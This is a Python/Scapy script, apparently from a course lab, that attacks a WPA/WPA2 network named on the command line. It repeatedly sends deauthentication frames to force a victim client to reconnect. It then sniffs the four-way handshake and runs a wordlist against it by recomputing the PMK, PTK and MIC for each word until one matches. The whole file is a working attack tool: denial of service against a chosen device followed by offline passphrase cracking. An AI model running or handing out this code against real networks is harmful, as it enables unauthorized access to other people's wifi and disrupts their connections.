#!/usr/bin/env python
# -*- coding: utf-8 -*-
from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2_math import pbkdf2_hex
from numpy import array_split
from numpy import array
import hmac, hashlib
import os
import sys 

interface = sys.argv[1]
ssidToHack = sys.argv[2]
victimMAC = sys.argv[3]

if (os.path.isfile("4way.pcap")):
	os.remove("4way.pcap")

def deauth(nbrTime, APmacArg, victimMAC):
	deauth = rdpcap("deauth.pcap")
	print "Starting deauth..."
	for n in range(nbrTime):
		sendp(deauth[0],iface=interface)

def AP_sniff(pkt):
	if pkt.type == 0 and pkt.subtype == 8:
		if pkt.info == ssidToHack:
			print "SSID to hack found"
			return True

def handshake_sniff(pkt):
	global handshakes
	# We stop when we found all we need
	if (handshakes[0] and handshakes[1] and handshakes[2]):
		return True
	# Filter : Handshake messages are type 2 and subtype 8 or 0
	if (pkt.type == 2 and (pkt.subtype == 0 or pkt.subtype == 8)):
		#Filter : Only handshake between victimMAC and APmac
		if((pkt.addr1 == victimMAC or pkt.addr1 == APmac) and (pkt.addr2 == APmac or pkt.addr2 == victimMAC)):

			#Handshake 1/4 has value 0x008a for Key information.
			if(not handshakes[0] and b2a_hex((pkt.load)[1:3]) == "008a"): #and 
				# Adding the frame to the table
				handshakes[0] = pkt
				print "Found handshake1/4"
			
			#Handshake 2/4 has value 0x010a for Key information.
			if(not handshakes[1] and b2a_hex((pkt.load)[1:3]) == "010a" ): #
				# Adding the frame to the table
				handshakes[1] = pkt
				print "Found handshake2/4"

			#Handshake 4/4 has value 0x030a for Key information.
			if(not handshakes[2] and b2a_hex((pkt.load)[1:3]) == "030a" ): #
				# Adding the frame to the table
				handshakes[2] = pkt
				print "Found handshake4/4"

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = ''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+chr(0x00)+B+chr(i),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

def testWord(passPhrase):
	"""
	This function take a passphrase, generate the mic and say if its equal to orignal
	or not.
	"""

	micToCompare = generateMic(passPhrase)

	print "Passphrase testée: " + passPhrase
	print "================================================"
	print "Mic original: " + micOriginal
	print "Mic à comparer: " + micToCompare

	if micToCompare == micOriginal:
		print "La passphrase utilisée est correcte !\n"
		sys.exit()
	else:
		print "Echec: essayer avec une nouvelle passphrase !\n"

def generateMic(passPhrase):
	"""
	This function generate a mic from a passphrase.
	"""

	#calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
	pmk = pbkdf2_hex(passPhrase, ssidToHack, 4096, 32)

	#expand pmk to obtain PTK
	ptk = customPRF512(a2b_hex(pmk),A,B)

	#calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
	mic = hmac.new(ptk[0:16],data,hashlib.sha1)

	mic = mic.hexdigest()[:32]

	return mic

def testWordList():
	#This function test each passphrase from a word list

	# Open the UNIX dictonary of words.
	with open('words.txt', 'r') as f:
		words = f.read().split()

	# Loop over all the words.
	for word in words:
		passphraseFound = testWord(word)

# Sniff le réseau en fct l'interface et filtres les paquets
pktAP = sniff(iface=interface,stop_filter=AP_sniff)

APmac = pktAP[len(pktAP)-1].addr2

print "APmac " + APmac

deauth(80, APmac, victimMAC)

print "Starting sniff for handshakes..."
# handshakes contain the essential part of the 4wayhandshake (msg : [0]msg1/4, [1]msg2/4, [2]msg4/4)
handshakes =[0] * 3
# S
pktHS = sniff(iface=interface,stop_filter=handshake_sniff)


# Important parameters for key derivation - most of them can be obtained from the pcap file
A           = "Pairwise key expansion" #this string is used in the pseudo-random function
ANonce      = (handshakes[0].load)[13:45]
SNonce      = (handshakes[1].load)[13:45]

micOriginal = b2a_hex((handshakes[2].load)[77:93])

victimMAC = a2b_hex(victimMAC.replace(":",""))
APmac = a2b_hex(APmac.replace(":",""))

B           = min(APmac,victimMAC)+max(APmac,victimMAC)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

replaceStr  = "0" * len(micOriginal)

data        = b2a_hex(str((handshakes[2])[EAPOL]))
data	    = data.replace(micOriginal,replaceStr)
data 	    = a2b_hex(data)


# Execute the script
testWordList()
